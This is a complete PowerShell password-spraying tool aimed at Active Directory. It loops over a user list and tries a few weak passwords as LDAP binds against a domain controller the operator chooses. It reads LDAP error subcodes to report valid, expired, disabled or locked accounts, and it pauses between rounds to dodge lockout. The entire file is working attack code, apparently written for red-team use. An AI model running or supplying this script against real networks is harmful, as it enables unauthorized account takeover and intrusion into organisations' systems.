Add-Type -AssemblyName System.DirectoryServices.Protocols

# Users file
$users = Get-Content ".\users.txt"

# Password list
$passwords = @(
    "Ab123456",
    "Az123456",
    "Aa123456"
)

# User input
$dc = Read-Host "Enter Domain Controller (example: DC01.Red.Team)"
$domain = Read-Host "Enter Domain (example: Red.Team)"

foreach ($password in $passwords){

    Write-Host "`n--------- Current Password $password ---------" -ForegroundColor Cyan

    foreach ($user in $users){

        $user = $user.Trim()

        try {

            $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($dc,389)

            $credential = New-Object System.Net.NetworkCredential(
                "$user@$domain",
                $password
            )

            #Negotiate
            try {

                $connection = New-Object System.DirectoryServices.Protocols.LdapConnection(
                    $identifier,
                    $credential,
                    [System.DirectoryServices.Protocols.AuthType]::Negotiate
                )

                $connection.SessionOptions.ProtocolVersion = 3
                $connection.Timeout = New-TimeSpan -Seconds 5

                $connection.Bind()
            }
            catch {

                # fallback ל-Basic כדי לקבל LDAP subcodes
                $connection = New-Object System.DirectoryServices.Protocols.LdapConnection(
                    $identifier,
                    $credential,
                    [System.DirectoryServices.Protocols.AuthType]::Basic
                )

                $connection.SessionOptions.ProtocolVersion = 3
                $connection.Timeout = New-TimeSpan -Seconds 5

                $connection.Bind()
            }

            Write-Host "[+] $user : VALID" -ForegroundColor Green

            $connection.Dispose()
        }
        catch {

            $msg = $_.Exception.InnerException.ServerErrorMessage

            if ($msg -match "data 52e") {
                Write-Host "[-] $user : INVALID" -ForegroundColor Red
            }
            elseif ($msg -match "data 773") {
                Write-Host "[!] $user : MUST CHANGE PASSWORD" -ForegroundColor Yellow
            }
            elseif ($msg -match "data 532") {
                Write-Host "[!] $user : PASSWORD EXPIRED" -ForegroundColor Yellow
            }
            elseif ($msg -match "data 533") {
                Write-Host "[!] $user : ACCOUNT DISABLED" -ForegroundColor Yellow
            }
            elseif ($msg -match "data 775") {
                Write-Host "[!] $user : ACCOUNT LOCKED" -ForegroundColor Yellow
            }
            else {
                Write-Host "[-] $user : ERROR" -ForegroundColor Magenta
                Write-Host $_.Exception.Message
            }
        }
    }

    Write-Host "`nSleeping 3 Seconds before next password spray...`n" -ForegroundColor DarkGray
    Start-Sleep -Seconds 3
}
